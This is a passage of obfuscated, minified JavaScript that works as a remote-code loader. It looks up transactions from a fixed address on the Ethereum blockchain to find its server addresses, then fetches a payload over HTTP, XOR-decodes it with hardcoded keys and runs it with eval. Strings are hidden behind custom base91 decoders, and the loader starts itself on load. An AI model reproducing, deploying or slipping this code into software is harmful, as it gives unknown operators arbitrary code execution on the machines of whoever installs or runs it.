P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
